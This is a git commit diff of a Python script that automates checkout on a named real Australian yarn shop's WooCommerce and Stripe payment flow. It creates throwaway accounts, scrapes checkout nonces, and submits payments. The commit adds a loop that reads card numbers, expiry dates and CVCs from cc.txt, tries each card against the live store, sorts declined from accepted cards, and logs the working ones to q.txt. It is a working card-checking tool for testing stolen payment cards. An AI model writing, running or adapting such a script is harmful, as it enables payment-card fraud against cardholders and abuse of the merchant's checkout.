37caa07f1ca5341a3bf383f21dc50ea06f0a6740
comder <134835757+comder0007@users.noreply.github.com>
2025-01-22 21:05:38 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,17 +1,24 @@
 import requests,random,string,re
+from colorama import Fore, Back, Style, init
 
-session = requests.Session()
-jar = requests.cookies.RequestsCookieJar()
-# jar.set('','')
-
+init(autoreset=True)
 def generate_random_name_and_email():
     first_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(5, 8))).capitalize()
     email = f"{first_name.lower()}{random.randint(10, 9999)}"
     return first_name, email
-name, mail = generate_random_name_and_email()
 
-def tele():
-    
+def Tele(ccx):
+    session = requests.Session()
+    jar = requests.cookies.RequestsCookieJar()
+#   jar.set('','')
+    name, mail = generate_random_name_and_email()
+    ccx = ccx.strip()
+    cc = ccx.split("|")[0]
+    mm = ccx.split("|")[1]
+    yy = ccx.split("|")[2]
+    cvc = ccx.split("|")[3]
+    if "20" in yy:
+        yy = yy.split("20")[1]
     #acc
     headers = {
         'accept': 'application/json',
@@ -32,6 +39,7 @@ def tele():
     data = f'email={mail}@gmail.com&mc_language=en&subscribed=1'
     response = session.post('https://yarnclub.com.au/wp-admin/admin-ajax.php',params=params,headers=headers,data=data,)
     jar.update(response.cookies)
+    print("account created" + mail)
     #addstore
     headers = {
         'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -58,6 +66,74 @@ def tele():
     }
     response = session.post('https://yarnclub.com.au/', params=params,headers=headers, data=data)
     jar.update(response.cookies)
+    # print("added prodcut")
+    #nonce
+    headers = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+        'accept-language': 'en-US,en;q=0.9',
+        'priority': 'u=0, i',
+        'referer': 'https://yarnclub.com.au/cart/',
+        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'document',
+        'sec-fetch-mode': 'navigate',
+        'sec-fetch-site': 'same-origin',
+        'sec-fetch-user': '?1',
+        'upgrade-insecure-requests': '1',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
+    }
+    response = session.get('https://yarnclub.com.au/checkout/',headers=headers)
+    match = re.search(r'id="woocommerce-process-checkout-nonce".*?value="(.*?)"', response.text)
+    if match:
+        nonce = match.group(1)
+        print("nonce:", nonce)
+    else:
+        print("nonce not found.")
+        exit()
+    jar.update(response.cookies)
+
+    #update order
+    headers = {
+    'accept': '*/*',
+    'accept-language': 'en-US,en;q=0.9',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'origin': 'https://yarnclub.com.au',
+    'priority': 'u=1, i',
+    'referer': 'https://yarnclub.com.au/checkout/',
+    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
+    params = {
+        'wc-ajax': 'update_order_review',
+    }
+    data = {
+    'security': '230871be2f',
+    'payment_method': 'stripe',
+    'country': 'AU',
+    'state': 'NSW',
+    'postcode': '',
+    'city': '',
+    'address': '',
+    'address_2': '',
+    's_country': 'AU',
+    's_state': 'NSW',
+    's_postcode': '',
+    's_city': '',
+    's_address': '',
+    's_address_2': '',
+    'has_full_address': 'false',
+    'post_data': f'wc_order_attribution_source_type=organic&wc_order_attribution_referrer=https%3A%2F%2Fwww.google.com%2F&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=google&wc_order_attribution_utm_medium=organic&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fyarnclub.com.au%2F%3Fsrsltid%3DAfmBOopfj9Igpg1iM8pu03MFvfCC4b552KOCdd3j1iu9QmJjF8sVrgtj&wc_order_attribution_session_start_time=2025-01-22%252012%253A59%253A19&wc_order_attribution_session_pages=6&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F132.0.0.0%20Safari%2F537.36&billing_first_name=&billing_last_name=&billing_company=&billing_country=AU&billing_address_1=&billing_address_2=&billing_city=&billing_state=NSW&billing_postcode=&billing_phone=&billing_email=aaaa%2540gmail.com&mailchimp_woocommerce_newsletter=1&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=NSW&shipping_postcode=&order_comments=&shipping_method%5B0%5D=wbs%3A8faa77c9_aus&payment_method=stripe&terms-field=1&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
+}
+    response = session.post('https://yarnclub.com.au/', params=params, headers=headers, data=data)
+    jar.update(response.cookies)
+
     #stripe
     headers = {
         'accept': 'application/json',
@@ -101,32 +177,6 @@ def tele():
     json_data = response.json()
     payment_id = json_data.get("id")
     print(f"Payment ID: {payment_id}")
-
-    #nonce
-    headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-        'accept-language': 'en-US,en;q=0.9',
-        'priority': 'u=0, i',
-        'referer': 'https://yarnclub.com.au/cart/',
-        'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'sec-fetch-dest': 'document',
-        'sec-fetch-mode': 'navigate',
-        'sec-fetch-site': 'same-origin',
-        'sec-fetch-user': '?1',
-        'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
-    }
-    response = session.get('https://yarnclub.com.au/checkout/',headers=headers)
-    match = re.search(r'id="woocommerce-process-checkout-nonce".*?value="(.*?)"', response.text)
-    if match:
-        nonce = match.group(1)
-        print("nonce:", nonce)
-    else:
-        print("nonce not found.")
-        exit()
-    jar.update(response.cookies)
     #checkout
     headers = {
         'accept': 'application/json, text/javascript, */*; q=0.01',
@@ -195,7 +245,25 @@ def tele():
         'stripe_source': f'{payment_id}'
     }
     response = session.post('https://yarnclub.com.au/', params=params,headers=headers, data=data)
-    # print(response.text)
-    jar.update(response.cookies)
+    if "declined." in response.text:
+        print(Fore.RED + f"{ccx} declined")
+    elif "incorrect." in response.text:
+        print(Fore.GREEN + f"{ccx}{response.text}")
+    else:
+        print(Fore.GREEN + f"{ccx}{response.text}")
+        with open("q.txt","a+")as f:
+            f.write(f"{ccx}{response.text}\n\n")
+    # jar.update(response.cookies)
+    # print(jar)
 
-    print(jar)
+try:
+    with open("cc.txt", "r") as f:
+        lines = f.readlines()
+        for line in lines:
+            line = line.strip()
+            Tele(line)
+            # time.sleep(20)
+except FileNotFoundError:
+    print(Fore.RED + f"The file 'cc.txt' was not found.")
+except Exception as e:
+    print(Fore.RED + f"An error occurred: {e}")
